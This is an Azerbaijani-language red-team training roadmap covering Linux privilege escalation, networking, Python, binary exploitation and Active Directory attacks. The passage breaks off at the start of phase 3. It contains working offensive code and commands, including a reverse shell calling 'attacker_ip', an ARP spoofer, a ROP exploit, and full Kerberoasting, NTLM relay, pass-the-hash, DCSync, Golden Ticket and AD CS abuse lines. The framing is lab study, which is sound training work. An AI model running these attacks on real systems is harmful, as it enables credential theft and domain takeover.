# 🎯 TAM ƏTRAFLΙ RED TEAM OPERATOR ROADMAP
## 12 Aylıq Dəqiq Plan - Materiallar, Sıra, Disiplin

---

# 📋 ÜMUMI STRUKTUR

```
TOTAL: 52 həftə (12 ay)
├─ Faza 1: Foundation (Həftə 1-8)  → 2 ay
├─ Faza 2: Active Directory Master (Həftə 9-20) → 3 ay
├─ Faza 3: Post-Exploitation (Həftə 21-28) → 2 ay
├─ Faza 4: Advanced Exploitation (Həftə 29-36) → 2 ay
└─ Faza 5: Real-World Mastery (Həftə 37-52) → 3 ay
```

---

# 🏗️ FAZA 1: FOUNDATION (HƏFTƏ 1-8)

## HƏFTƏ 1-2: LINUX MASTERY

### **Materiallar:**

**Kitablar:**
1. "The Linux Command Line" - William Shotts (Əsas) - [Free PDF: linuxcommand.org]
2. "Linux Basics for Hackers" - OccupyTheWeb (Praktik)

**Video Kurslar:**
- TryHackMe: "Linux Fundamentals" (Part 1-3)
- HackTheBox Academy: "Linux Fundamentals"

**Lab Platforması:**
- TryHackMe: Linux PrivEsc, Linux PrivEsc Arena
- HackTheBox: Easy Linux machines (10 ədəd)

### **Öyrənmə Sırası:**

**GÜN 1-3: Basic Commands & File System**
```
SƏHƏR (2 saat): Nəzəriyyə
├─ File system hierarchy (/etc, /var, /tmp, /proc, /sys)
├─ Basic commands (ls, cd, cat, grep, find, awk, sed)
└─ File permissions (rwx, octal notation)

AXŞAM (3 saat): Praktika
├─ TryHackMe: Linux Fundamentals Room
├─ Terminallda 50+ command praktika
└─ Notes: Notion-da command cheat sheet

TAPŞIRIQ:
├─ /etc directory-dəki bütün conf faylları oxuyun
├─ /proc/[pid] directory-lərini araşdırın
└─ Öz file finder script-i yazın (bash)
```

**GÜN 4-6: Process & Permissions Deep**
```
SƏHƏR (2 saat):
├─ Process management (ps, top, htop, /proc)
├─ Signals (SIGTERM, SIGKILL, SIGHUP)
├─ SUID/SGID/Sticky bit
├─ Capabilities (getcap, setcap)

AXŞAM (3 saat):
├─ `strace ls` - system call analiz
├─ `ltrace` - library call analiz
├─ SUID binary-ləri tapın: find / -perm -4000 2>/dev/null
└─ TryHackMe: Linux PrivEsc Room başlayın

TAPŞIRIQ:
├─ 5 SUID binary exploit edin (GTFOBins istifadə)
├─ Capabilities exploit: cap_setuid+ep
└─ Bash script: Process monitor (CPU/Memory tracking)
```

**GÜN 7-10: Privilege Escalation Focus**
```
SƏHƏR (2 saat):
├─ LinPEAS script analiz edin (source code oxuyun)
├─ Enumeration checklist yaradın
└─ Kernel exploits (Dirty COW, DirtyCred research)

AXŞAM (3 saat):
├─ TryHackMe: Linux PrivEsc Arena (10+ machines)
├─ HTB: Easy Linux machines (3-4 ədəd)
├─ Hər machine üçün detailed writeup yazın

TAPŞIRIQ:
├─ 20+ privilege escalation technique-i test edin
├─ Öz enumeration script-i yazın (bash)
└─ Cheat sheet: Linux PrivEsc (öz əlinizlə)

NƏTICƏ CHECK:
☐ 20+ machine root aldım
☐ SUID/Capabilities/Cron/Path exploitation edə bilirəm
☐ LinPEAS script-in nə etdiyini tam başa düşürəm
☐ Bash-da 10 script yazmışam
```

### **Həftəlik Disiplin:**
```
Bazar ertəsi - Cümə:
06:00-08:00 → Səhər nəzəriyyə (kitab oxu, notes götür)
18:00-21:00 → Axşam hands-on lab
21:00-21:30 → Documentation (bloq yazısı/notes)

Şənbə:
10:00-14:00 → Challenge day (HTB machine, heç nəyə baxmadan)
14:00-15:00 → Writeup yaz (əgər həll etsən)

Bazar:
11:00-13:00 → Həftəlik review (nə öyrəndim?)
13:00-14:00 → Növbəti həftə plan
```

---

## HƏFTƏ 3-4: NETWORKING DEEP DIVE

### **Materiallar:**

**Kitablar:**
1. "TCP/IP Illustrated, Volume 1" - W. Richard Stevens (Chapter 1-6, 17-20)
2. "Network Security Assessment" - Chris McNab (Chapter 3-5)

**Video/Kurslar:**
- TCM Security: "Practical Ethical Hacking" (Networking section)
- Professor Messer: Network+ (seçilmiş videolar)

**Tools:**
- Wireshark
- Scapy (Python library)
- nmap source code

### **Öyrənmə Sırası:**

**GÜN 1-4: Protocol Deep Dive**
```
SƏHƏR (2 saat): Packet Structure
├─ Ethernet frame (MAC addresses, EtherType)
├─ IP header (source, dest, TTL, fragmentation)
├─ TCP header (flags, seq/ack, window)
├─ UDP header

PRAKTIKA:
├─ Wireshark-da 20+ capture analiz edin (wireshark.org samples)
├─ Scapy-də packet yaradın:
    >>> from scapy.all import *
    >>> packet = IP(dst="google.com")/TCP(dport=80)
    >>> send(packet)
├─ Hər protocol header-i əl ilə çəkin (diaqram)

TAPŞIRIQ:
├─ TCP 3-way handshake-i capture edib analiz edin
├─ HTTP request packet-i byte-by-byte izah edin
└─ Scapy-də SYN scanner yazın (incomplete TCP handshake)
```

**GÜN 5-7: Network Attacks**
```
SƏHƏR (2 saat):
├─ ARP spoofing necə işləyir
├─ DNS spoofing/cache poisoning
├─ DHCP starvation
├─ VLAN hopping basics

AXŞAM (3 saat):
├─ Lab environment: 2 VM (Kali + victim)
├─ ARP spoofing manual (arpspoof tool)
├─ ettercap ilə MITM
├─ Wireshark-da traffic capture

TAPŞIRIQ:
├─ MITM attack qurub HTTP credentials capture edin
├─ SSL strip attack (sslstrip tool)
├─ DNS spoofing ilə fake website göstərin
└─ Scapy-də ARP spoofer yazın

# ARP Spoofer (Python):
from scapy.all import *
def arp_spoof(target_ip, gateway_ip):
    packet = ARP(op=2, pdst=target_ip, 
                 hwdst=getmacbyip(target_ip),
                 psrc=gateway_ip)
    send(packet, verbose=False)
```

**GÜN 8-10: Advanced Network**
```
SƏHƏR (2 saat):
├─ NAT/PAT necə işləyir
├─ Tunneling protocols (SSH, VPN)
├─ IPv6 basics (və IPv4-dən fərqlər)
├─ TLS handshake dərindən

AXŞAM (3 saat):
├─ Pivoting lab (HTB machines ilə)
├─ SSH tunneling (local/remote/dynamic port forwarding)
├─ Chisel/ligolo-ng istifadə
├─ DNS tunneling (data exfiltration)

TAPŞIRIQ:
├─ Multi-hop SSH tunnel qurub daxili network-ə girin
├─ DNS tunneling ilə data exfiltration edin (dnscat2)
├─ IPv6 neighbor discovery scan edin
└─ TLS traffic-i capture edib metadata analiz edin

NƏTICƏ CHECK:
☐ Wireshark-da hər protocol-u tanıyıram
☐ MITM attack qura bilirəm (3+ method)
☐ Scapy-də 5 tool yazmışam
☐ Pivoting/tunneling edə bilirəm
☐ TCP/IP headers-i əzbərdən izah edə bilirəm
```

---

## HƏFTƏ 5-6: PYTHON FOR RED TEAM

### **Materiallar:**

**Kitablar:**
1. "Black Hat Python" - Justin Seitz (ƏN VACİB!)
2. "Violent Python" - TJ O'Connor
3. Python documentation (docs.python.org)

**Kurslar:**
- Udemy: "Python for Pentesters" (TCM Security)
- Real Python: Advanced Python tutorials

### **Öyrənmə Sırası:**

**GÜN 1-3: Python Fundamentals**
```
SƏHƏR (2 saat):
├─ Data types, functions, OOP
├─ File I/O, exception handling
├─ Regular expressions (re module)
└─ List/dict comprehension

AXŞAM (3 saat):
├─ 10 simple script yazın:
   1. Port scanner (socket module)
   2. Directory bruteforcer
   3. Hash cracker (wordlist)
   4. Log parser
   5. File encryptor (AES)
   6. Keylogger (pynput)
   7. Screenshot taker
   8. Network sniffer
   9. HTTP request sender
   10. Subdomain enumerator

QAYDA: Hər script-i əl ilə yazın, copy-paste YOX!
```

**GÜN 4-7: Socket Programming & Exploitation Libraries**
```
SƏHƏR (2 saat):
├─ Socket module (TCP/UDP server/client)
├─ Threading & multiprocessing
├─ Requests library (HTTP/S)
└─ Paramiko (SSH automation)

AXŞAM (3 saat):
├─ Multi-threaded port scanner
├─ SSH brute-forcer (paramiko)
├─ HTTP/S client (custom headers, cookies)
├─ Reverse shell (socket-based)

# Simple Reverse Shell:
import socket, subprocess, os
s = socket.socket()
s.connect(("attacker_ip", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()
```

**GÜN 8-12: Advanced Tools**
```
SƏHƏR (2 saat):
├─ Scapy (packet manipulation)
├─ Impacket library (SMB, RDP, LDAP)
├─ Pwntools (exploitation)
└─ BeautifulSoup (web scraping)

AXŞAM (3 saat):
├─ Scapy: Custom packet craft & send
├─ Impacket: SMB enumeration, secretsdump
├─ Pwntools: Buffer overflow exploit template
├─ Web scraper: Extract emails/subdomains

TAPŞIRIQ:
├─ Scapy-də ARP scanner, TCP SYN scanner
├─ Impacket-lə SMB share enumeration script
├─ Pwntools-la simple pwn challenge həll edin
└─ Web scraper: LinkedIn/GitHub profile finder

FINAL PROJECT:
├─ Vulnerability Scanner:
   ├─ Port scanning
   ├─ Service detection
   ├─ Common vulns check (SQLi, XSS test)
   ├─ Report generator (HTML/PDF)
   └─ Multi-threaded
└─ GitHub-da paylaşın (portfolio)

NƏTICƏ CHECK:
☐ 25+ Python script yazmışam
☐ Socket programming-lə network tools yazıram
☐ Scapy, Impacket, Pwntools istifadə edirəm
☐ Multi-threading implementation edə bilirəm
☐ GitHub portfolio-da 5+ tool var
```

---

## HƏFTƏ 7-8: C & BINARY EXPLOITATION BASICS

### **Materiallar:**

**Kitablar:**
1. "Hacking: The Art of Exploitation" - Jon Erickson (ƏN VACİB!)
2. "The Shellcoder's Handbook" - Chris Anley
3. "Practical Binary Analysis" - Dennis Andriesse

**Platformalar:**
- pwnable.kr (Toddler, Rookies)
- pwn.college
- picoCTF (Binary Exploitation)

### **Öyrənmə Sırası:**

**GÜN 1-4: C Programming Essentials**
```
SƏHƏR (2 saat):
├─ Pointers (pointer arithmetic, double pointers)
├─ Memory layout (stack, heap, BSS, data, text)
├─ Arrays vs pointers
├─ Function pointers
└─ Dynamic memory (malloc, free)

AXŞAM (3 saat):
├─ "Hacking: Art of Exploitation" Chapter 1-3 oxuyun
├─ Hər code example-i yazıb compile edin
├─ GDB-də debug edin:
   - Breakpoint qoyun
   - Memory examine edin (x/20x $rsp)
   - Registers baxın (info registers)

CODE EXAMPLES:
// Vulnerable buffer overflow
#include <string.h>
void vuln(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds check!
}
int main(int argc, char *argv[]) {
    vuln(argv[1]);
    return 0;
}

TAPŞIRIQ:
├─ 10+ C program yazın (linked list, stack, queue)
├─ GDB-də hər program-ı step-by-step debug edin
└─ Valgrind ilə memory leak-ləri tapın
```

**GÜN 5-8: Buffer Overflow Basics**
```
SƏHƏR (2 saat):
├─ Stack frame structure (RBP, RSP, RIP)
├─ Function calling convention (x86-64)
├─ Buffer overflow necə baş verir
├─ Return address overwrite
└─ Shellcode basics

AXŞAM (3 saat):
├─ pwnable.kr: fd, collision, bof, flag
├─ picoCTF: Buffer overflow 1, 2, 3
├─ Exploit template:

# Exploit structure:
payload = b"A" * offset       # Fill buffer
payload += p64(RIP_address)   # Overwrite RIP
payload += shellcode          # Execute code

GDB WORKFLOW:
1. gdb ./vulnerable
2. (gdb) run $(python -c 'print("A"*100)')
3. (gdb) x/20x $rsp  # Check stack
4. (gdb) info frame  # See RBP, RIP
5. Find offset: RIP - buffer_start

TAPŞIRIQ:
├─ 10 buffer overflow challenge həll edin
├─ Shellcode yazın: execve("/bin/sh", NULL, NULL)
├─ NOP sled istifadə edin
└─ GDB-də exploit-i step-by-step test edin
```

**GÜN 9-14: Advanced Exploitation**
```
SƏHƏR (2 saat):
├─ ASLR, DEP, PIE nədir?
├─ ROP (Return-Oriented Programming)
├─ Format string vulnerabilities
└─ Use-after-free basics

AXŞAM (3 saat):
├─ pwnable.kr: passcode, random, input
├─ ROP chain yazma:
   - ROPgadget tool
   - libc base leak
   - system() call

# ROP exploit example:
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak libc
payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Call system("/bin/sh")
payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendline(payload)
p.interactive()

TAPŞIRIQ:
├─ pwn.college: All challenges (50+)
├─ Format string: %n arbitrary write
├─ ROP chain: bypass DEP
├─ Heap exploitation: use-after-free
└─ 5+ CVE exploit-ini təkrar yazın

NƏTICƏ CHECK:
☐ GDB-də exploit develop edə bilirəm
☐ Buffer overflow manual exploit yazıram
☐ ROP chain qura bilirəm
☐ Shellcode yazıb test edirəm
☐ pwnable.kr Rookies tamam
☐ 20+ binary exploitation challenge həll etmişəm
```

### **FAZA 1 BİTDİ - REVİEW:**
```
8 həftə sonra yoxlama:
☐ Linux: 30+ machine root aldım
☐ Network: Wireshark expert, MITM attacks
☐ Python: 30+ tool yazmışam, GitHub-da portfolio
☐ C/Binary: 25+ pwn challenge, ROP chains
☐ Bloq: 10+ yazı (Medium/personal blog)
☐ GitHub: Active (contributions)

ƏGƏR YUXARILAR ✅ → FAZA 2-yə keçin
ƏGƏR YOX → Problem olan hissəni 1 həftə təkrar edin
```

---

# 🏰 FAZA 2: ACTIVE DIRECTORY MASTER (HƏFTƏ 9-20)

*Bu faza ƏN VACİB - Real dünyada AD hər yerdədir!*

## HƏFTƏ 9-10: AD ARCHITECTURE & SETUP

### **Materiallar:**

**Kitablar/Blogs:**
1. "Active Directory Security" - Sean Metcalf (adsecurity.org)
2. harmj0y blog (blog.harmj0y.net)
3. Microsoft AD documentation (learn.microsoft.com)

**Video Kurslar:**
- TCM Security: "Practical Ethical Hacking" (AD section)
- Altered Security: CRTP course (recommend!)

**Lab:**
- Home AD Lab (VirtualBox/VMware)

### **Öyrənmə Sırası:**

**GÜN 1-3: AD Components & Setup**
```
SƏHƏR (2 saat):
├─ Domain, Forest, Tree structure
├─ Domain Controllers, Member servers
├─ Organizational Units (OUs)
├─ Trusts (Parent-Child, Forest, External)
├─ Global Catalog, DNS integration
└─ FSMO roles

AXŞAM (4 saat):
├─ HOME LAB SETUP:
   ├─ Windows Server 2019 (Domain Controller)
   ├─ Windows 10 (2-3 workstation)
   ├─ Join domain
   ├─ Create users (10+)
   ├─ Create groups (IT, HR, Admins)
   ├─ Create OUs
   └─ Configure DNS

LAB TOPOLOGY:
DC1 (192.168.1.10) - Primary DC
├─ Domain: LAB.LOCAL
├─ Users: john, sarah, admin, svc_sql
└─ Groups: Domain Admins, IT-Staff

WS01, WS02 (192.168.1.20-21) - Workstations
├─ Logged users: john, sarah
└─ Services running as domain accounts

TAPŞIRIQ:
├─ PowerShell: AD module commands
   Get-ADUser, Get-ADGroup, Get-ADComputer
├─ Create 20 users (script-lə)
├─ Setup Service accounts (SPNs)
└─ Configure share folders (SMB)
```

**GÜN 4-7: AD Enumeration**
```
SƏHƏR (2 saat):
├─ LDAP protocol
├─ LDAP queries & filters
├─ DNS records (AD-integrated DNS)
├─ SMB enumeration
└─ RPC enumeration

AXŞAM (3 saat):
├─ BloodHound setup (collector və GUI)
├─ PowerView commands:
   Get-DomainUser
   Get-DomainGroup
   Get-DomainComputer
   Get-DomainGPO
   Find-LocalAdminAccess
   Get-DomainTrust

├─ SharpHound collector run
├─ BloodHound data analysis:
   - Shortest path to DA
   - Kerberoastable users
   - AS-REP Roastable users
   - Unconstrained delegation

# PowerView enumeration:
. .\PowerView.ps1
Get-DomainUser -Properties samaccountname,memberof
Get-DomainGroup -Identity "Domain Admins" -Recurse
Find-LocalAdminAccess
Get-DomainGPOLocalGroup

TAPŞIRIQ:
├─ Home lab-da BloodHound run edin
├─ Attack path-ları tapın (GUI-də)
├─ LDAP query yazın (ldapsearch tool)
├─ SMB shares enumerate edin (smbclient, crackmapexec)
└─ DNS zone transfer test edin

NƏTICƏ CHECK:
☐ BloodHound istifadə edirəm (data analysis)
☐ PowerView commands əzbərimdə
☐ LDAP queries yaza bilirəm
☐ AD enumeration full edə bilirəm
```

---

## HƏFTƏ 11-12: KERBEROS DEEP DIVE

### **Materiallar:**

**Blogs/Resources:**
1. "Kerberos Explained" - Tarlogic Security
2. "Kerberoasting" - Tim Medin (DerbyCon talk)
3. RFC 4120 (Kerberos protocol)

**Tools:**
- Rubeus (C# tool)
- Impacket (GetUserSPNs.py, GetNPUsers.py)
- mimikatz

### **Öyrənmə Sırası:**

**GÜN 1-4: Kerberos Protocol**
```
SƏHƏR (3 saat):
├─ Kerberos components:
   - KDC (Key Distribution Center)
   - AS (Authentication Service)
   - TGS (Ticket Granting Service)
   - TGT (Ticket Granting Ticket)
   - ST (Service Ticket)

├─ Authentication flow:
   1. User → AS: Request TGT
   2. AS → User: TGT (encrypted with krbtgt hash)
   3. User → TGS: Request ST (present TGT)
   4. TGS → User: ST (encrypted with service hash)
   5. User → Service: Present ST
   6. Service: Decrypt ST, grant access

├─ Encryption types: RC4, AES128, AES256
├─ SPNs (Service Principal Names)
└─ Pre-authentication

AXŞAM (3 saat):
├─ Wireshark: Kerberos traffic capture
├─ Analyze TGT, TGS-REQ, TGS-REP packets
├─ View ticket structure (klist, mimikatz)

# View tickets:
klist  # Windows
klist -l  # Linux

# Mimikatz:
mimikatz # sekurlsa::tickets

TAPŞIRIQ:
├─ Diaqram çəkin: Kerberos authentication flow
├─ Wireshark-da Kerberos traffic analiz edin
├─ TGT struktur-unu izah edin (PAC, timestamps)
└─ Encryption type fərqlərini test edin
```

**GÜN 5-8: Kerberoasting Attack**
```
SƏHƏR (2 saat):
├─ SPN-lər nə üçün lazımdır?
├─ Service account-lar
├─ TGS-REP ticket-i decrypt etmək
├─ Hash cracking (Hashcat, John)

AXŞAM (3 saat):
├─ HOME LAB:
   - Service account yaradın: svc_sql
   - SPN set edin:
     setspn -A MSSQLSvc/SQL01:1433 LAB\svc_sql
   - Weak password verin: Password123

├─ ATTACK:
   # Impacket:
   GetUserSPNs.py LAB.LOCAL/john:password -dc-ip 192.168.1.10 -request

   # Rubeus:
   Rubeus.exe kerberoast /outfile:hashes.txt

   # Hashcat crack:
   hashcat -m 13100 hashes.txt rockyou.txt

   # Invoke-Kerberoast (PowerView):
   Invoke-Kerberoast -OutputFormat Hashcat

TAPŞIRIQ:
├─ Home lab-da 5 service account yaradın
├─ Kerberoast edin (3 fərqli tool-la)
├─ Hash-ları crack edin
├─ Cracked password-lə lateral movement
└─ Detection: Windows Event logs (4769) analiz edin

NƏTICƏ CHECK:
☐ Kerberos protocol-u dəqiq izah edə bilirəm
☐ Kerberoasting attack manual edirəm
☐ Hash crack edib account compromise edirəm
☐ SPN enumeration edə bilirəm
```

---

## HƏFTƏ 13-14: AS-REP ROASTING & NTLM

### **Öyrənmə Sırası:**

**GÜN 1-4: AS-REP Roasting**
```
SƏHƏR (2 saat):
├─ Pre-authentication nədir?
├─ "Do not require Kerberos preauthentication"
├─ AS-REP ticket structure
└─ Hash cracking

AXŞAM (3 saat):
├─ HOME LAB:
   - User yaradın: victim
   - Disable pre-auth:
     Set-ADAccountControl -Identity victim 
     -DoesNotRequirePreAuth $true

├─ ATTACK:
   # Impacket:
   GetNPUsers.py LAB.LOCAL/ -usersfile users.txt -dc-ip 192.168.1.10

   # Rubeus:
   Rubeus.exe asreproast /format:hashcat

   # Hashcat:
   hashcat -m 18200 hash.txt rockyou.txt

TAPŞIRIQ:
├─ AS-REP roasting attack home lab-da
├─ Enumeration: Tapın pre-auth disabled users
├─ Mass crack (wordlist: rockyou, custom)
└─ Mitigation: Enable pre-auth, strong passwords
```

**GÜN 5-8: NTLM Protocol & Attacks**
```
SƏHƏR (2 saat):
├─ NTLM authentication flow (Challenge-Response)
├─ NTLMv1 vs NTLMv2
├─ NTLM hash format (NT hash)
├─ SMB signing
└─ LDAP signing

AXŞAM (3 saat):
├─ NTLM Relay Attack:
   # Setup:
   - Responder (capture hashes)
   - ntlmrelayx (relay attacks)

   # Attack:
   python3 Responder.py -I eth0 -wdP
   ntlmrelayx.py -t 192.168.1.10 -smb2support

   # SMB signing disabled-də relay edib:
   - Command execution
   - SAM dump
   - Domain user create

├─ Pass-the-Hash:
   # Impacket:
   psexec.py LAB/admin@192.168.1.20 -hashes :nt_hash

   # CrackMapExec:
   crackmapexec smb 192.168.1.0/24 -u admin -H nt_hash

TAPŞIRIQ:
├─ Responder-lə hash capture edin
├─ NTLM relay attack (SMB signing off)
├─ Pass-the-Hash lateral movement
├─ Hash dump: secretsdump.py
└─ Mimikatz: sekurlsa::pth

NƏTICƏ CHECK:
☐ AS-REP roasting manual edirəm
☐ NTLM relay attack qururam
☐ Pass-the-Hash istifadə edirəm
☐ SMB signing-i check edə bilirəm
```

---

## HƏFTƏ 15-16: DELEGATION ATTACKS

### **Materiallar:**
- "Wagging the Dog" - Elad Shamir (blog post)
- "The Worst of Both Worlds" - Lee Christensen
- harmj0y delegation blog posts

### **Öyrənmə Sırası:**

**GÜN 1-5: Unconstrained Delegation**
```
SƏHƏR (3 saat):
├─ Delegation növləri:
   - Unconstrained
   - Constrained
   - Resource-based constrained

├─ Unconstrained delegation necə işləyir:
   - Server TGT-ni cache edir
   - Impersonation imkanı
   - Domain Controller-də default enabled

├─ Attack scenario:
   1. Find unconstrained delegation server
   2. Compromise that server
   3. Wait for privileged user (DA)
   4. Extract TGT from memory
   5. Use TGT → Domain Admin

AXŞAM (3 saat):
├─ HOME LAB:
   - Server yaradın: SRV01
   - Enable unconstrained delegation:
     Set-ADComputer SRV01 -TrustedForDelegation $true
   - Admin login force edin (scheduled task)

├─ ATTACK:
   # Find:
   Get-DomainComputer -Unconstrained

   # Rubeus (monitor):
   Rubeus.exe monitor /interval:5

   # Admin login SRV01-ə → TGT captured
   # Rubeus (use ticket):
   Rubeus.exe ptt /ticket:base64_ticket

   # DCSync:
   mimikatz # lsadump::dcsync /user:krbtgt

TAPŞIRIQ:
├─ Unconstrained delegation abuse
├─ TGT capture və reuse
├─ Printer bug + unconstrained = DC compromise
└─ Mitigation research edin
```

**GÜN 6-10: Constrained Delegation & RBCD**
```
SƏHƏR (3 saat):
├─ Constrained delegation:
   - S4U2Self, S4U2Proxy
   - msDS-AllowedToDelegateTo attribute
   - Protocol transition

├─ Resource-based constrained delegation (RBCD):
   - msDS-AllowedToActOnBehalfOfOtherIdentity
   - Attacker-controlled resource

AXŞAM (3 saat):
├─ HOME LAB:
   - Constrained delegation setup:
     Set-ADUser svc_web -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC01')}

├─ ATTACK:
   # Rubeus S4U:
   Rubeus.exe s4u /user:svc_web /rc4:ntlm_hash 
   /impersonateuser:Administrator /msdsspn:CIFS/DC01 /ptt

   # RBCD attack:
   # 1. Create computer account
   # 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity
   # 3. S4U2Self → Administrator ticket
   # 4. Access resource

   # Impacket:
   getST.py -spn CIFS/DC01 -impersonate Administrator LAB.LOCAL/svc_web

TAPŞIRIQ:
├─ Constrained delegation attack
├─ RBCD attack (full chain)
├─ Sensitive accounts vs delegation
└─ Detection: Event logs analysis

NƏTICƏ CHECK:
☐ 3 delegation type-ı izah edə bilirəm
☐ Unconstrained delegation abuse edə bilirəm
☐ S4U attacks manual yerinə yetirirəm
☐ RBCD attack chain edə bilirəm
```

---

## HƏFTƏ 17-18: ACL ABUSE & GPO EXPLOITATION

### **Öyrənmə Sırası:**

**GÜN 1-5: ACL (Access Control List) Abuse**
```
SƏHƏR (2 saat):
├─ ACE (Access Control Entry) types:
   - GenericAll, GenericWrite
   - WriteDacl, WriteOwner
   - ForceChangePassword
   - AddMember
   - ReadLAPSPassword

├─ Attack paths:
   User1 → GenericAll → User2 → MemberOf → Domain Admins

AXŞAM (3 saat):
├─ HOME LAB:
   # Setup vulnerable ACL:
   $user = Get-ADUser "john"
   $target = Get-ADUser "admin"
   $acl = Get-Acl "AD:\$($target.DistinguishedName)"
   $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
       $user.SID, "GenericAll", "Allow"
   )
   $acl.AddAccessRule($ace)
   Set-Acl -Path "AD:\$($target.DistinguishedName)" -AclObject $acl

├─ ATTACK:
   # BloodHound: Find path
   # PowerView:
   Add-DomainObjectAcl -TargetIdentity admin -PrincipalIdentity john -Rights All

   # Abuse GenericAll:
   $pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
   Set-ADAccountPassword -Identity admin -NewPassword $pass

   # Add to group:
   Add-ADGroupMember -Identity "Domain Admins" -Members john

TAPŞIRIQ:
├─ BloodHound-da 10+ ACL abuse path tapın
├─ GenericAll, WriteDacl abuse edin
├─ ForceChangePassword attack
├─ AddMember to Domain Admins
└─ WriteOwner → WriteDacl → GenericAll (chain)
```

**GÜN 6-10: GPO (Group Policy Object) Exploitation**
```
SƏHƏR (2 saat):
├─ GPO structure (SYSVOL, GPC, GPT)
├─ GPO application order
├─ GPO permissions (GenericAll on GPO)
├─ Scheduled tasks via GPO
├─ Immediate tasks

AXŞAM (3 saat):
├─ HOME LAB:
   # Give john GenericAll on GPO:
   Set-GPPermissions -Name "Default Domain Policy" 
   -TargetName "john" -TargetType User -PermissionLevel GpoEditDeleteModifySecurity

├─ ATTACK:
   # SharpGPOAbuse:
   SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" 
   --Author LAB\Administrator --Command "cmd.exe" --Arguments "/c net user hacker Pass123! /add" 
   --GPOName "Default Domain Policy"

   # Manual:
   # 1. Find writable GPO (BloodHound/PowerView)
   # 2. Add scheduled task (PowerSploit)
   # 3. gpupdate /force on target
   # 4. Task executes as SYSTEM

TAPŞIRIQ:
├─ GPO enumeration (Get-DomainGPO)
├─ Find vulnerable GPOs (writable)
├─ Add scheduled task (command execution)
├─ Add local admin via GPO
└─ GPO backup/restore abuse

NƏTICƏ CHECK:
☐ ACL abuse attack paths edə bilirəm
☐ BloodHound-da complex paths analiz edirəm
☐ GPO exploitation manual edirəm
☐ GenericAll/WriteDacl/WriteOwner abuse
```

---

## HƏFTƏ 19-20: DOMAIN DOMINANCE & AD CS

### **Öyrənmə Sırası:**

**GÜN 1-5: Domain Dominance**
```
SƏHƏR (2 saat):
├─ DCSync attack:
   - Directory Replication (DS-Replication-Get-Changes)
   - krbtgt hash extraction
   - All user hashes

├─ Golden Ticket:
   - krbtgt hash → forge TGT
   - Any user, any group
   - Lifetime: 10 years (default)

├─ Silver Ticket:
   - Service hash → forge ST
   - Limited to specific service

AXŞAM (3 saat):
├─ HOME LAB:
├─ DCSync:
   # Mimikatz:
   lsadump::dcsync /user:krbtgt
   lsadump::dcsync /domain:LAB.LOCAL /all

   # Impacket:
   secretsdump.py LAB.LOCAL/admin@DC01

├─ Golden Ticket:
   # Mimikatz:
   kerberos::golden /user:FakeAdmin /domain:LAB.LOCAL 
   /sid:S-1-5-21-... /krbtgt:ntlm_hash /ptt

   # Impacket:
   ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... 
   -domain LAB.LOCAL FakeAdmin

├─ Silver Ticket:
   # CIFS service:
   kerberos::golden /user:admin /domain:LAB.LOCAL /sid:S-1-5-21-... 
   /target:DC01.LAB.LOCAL /service:CIFS /rc4:computer_ntlm_hash /ptt

TAPŞIRIQ:
├─ DCSync attack (credential dump)
├─ Golden Ticket create və test
├─ Silver Ticket (multiple services)
├─ Domain backup (ntds.dit extraction)
└─ Persistence: AdminSDHolder, DCShadow research
```

**GÜN 6-10: AD Certificate Services (AD CS)**
```
SƏHƏR (2 saat):
├─ AD CS architecture
├─ Certificate templates
├─ Enrollment permissions
├─ ESC1-ESC8 (8 attack scenario)
├─ PKINIT authentication

AXŞAM (3 saat):
├─ HOME LAB:
   - Install AD CS role
   - Create vulnerable template (ESC1):
     - Client Authentication EKU
     - Enrollee Supplies Subject
     - Domain Users can enroll

├─ ATTACK (ESC1):
   # Certify:
   Certify.exe find /vulnerable
   Certify.exe request /ca:DC01\LAB-CA /template:VulnTemplate 
   /altname:Administrator

   # Convert PFX:
   Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:pass /ptt

   # Now you are Administrator!

TAPŞIRIQ:
├─ Certify tool istifadə edin
├─ ESC1, ESC2, ESC3 attacks
├─ Certificate-based authentication
├─ Persistence via certificate
└─ NTLM relay to AD CS (ESC8)

NƏTICƏ CHECK:
☐ DCSync attack edirəm
☐ Golden Ticket forge edə bilirəm
☐ AD CS ESC1-3 attacks edirəm
☐ Certificate-based auth istifadə edirəm
```

---

## HƏFTƏ 21: AD FINAL - PRO LABS

```
HƏFTƏ 21: HTB Pro Labs
├─ RastaLabs (Full chain AD exploitation)
   ├─ External → Internal
   ├─ Multiple domains
   ├─ Kerberoasting, Delegation, ACL
   └─ Domain Admin compromise

├─ Offshore (Advanced AD)
   ├─ Complex trust relationships
   ├─ Cross-domain attacks
   └─ Multi-forest exploitation

DAILY:
├─ 6-8 saat hands-on
├─ Heç nəyə baxmayın (blind)
├─ Ilışsanız 4 saat çalışın
├─ Sonra methodology review
└─ Detailed notes/blog

NƏTICƏ CHECK (FAZA 2 BİTDİ):
☐ AD architecture tam anlayıram
☐ BloodHound expert
☐ Kerberos attacks (Roasting, Delegation)
☐ NTLM relay, Pass-the-Hash
☐ ACL/GPO abuse
☐ DCSync, Golden Ticket
☐ AD CS attacks
☐ HTB Pro Labs: 2 lab tamam (RastaLabs, Offshore)
☐ Home lab: Complex environment
☐ Bloq: 15+ AD yazısı

ƏGƏR YUXARILAR ✅ → FAZA 3
ƏGƏR YOX → Problem olan hissəni 1 həftə əlavə
```

---

# ⚡ FAZA 3: POST-EXPLOITATION (HƏFTƏ 22-28)

## HƏFTƏ 22-24: CREDENTIAL ACCESS & PERSISTENCE

### **Materiallar:**

**Resources:**
